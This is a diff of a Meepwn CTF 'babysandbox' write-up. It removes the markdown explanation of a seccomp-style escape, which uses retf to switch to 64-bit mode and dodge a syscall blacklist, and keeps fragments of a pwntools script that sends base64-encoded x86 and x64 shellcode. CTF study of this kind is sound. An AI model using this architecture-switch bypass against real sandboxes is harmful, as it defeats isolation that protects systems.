@@ -1,7 +1,3 @@
-# Meepwn CTF - babysandbox
-* `retf` instroction change `cs` to 0x33 -> switch to x64 mode and execute x64 instruction.
-* Different syscall number in x64 -> bypass sandbox badsyscall number black list.
-```python
 #!/usr/bin/env python
 from pwn import *
 from base64 import b64encode as b64en
@@ -45,4 +41,3 @@ print b64en( x86 + x64 )
 y.send( x86 + x64 )
 
 y.interactive()
-```
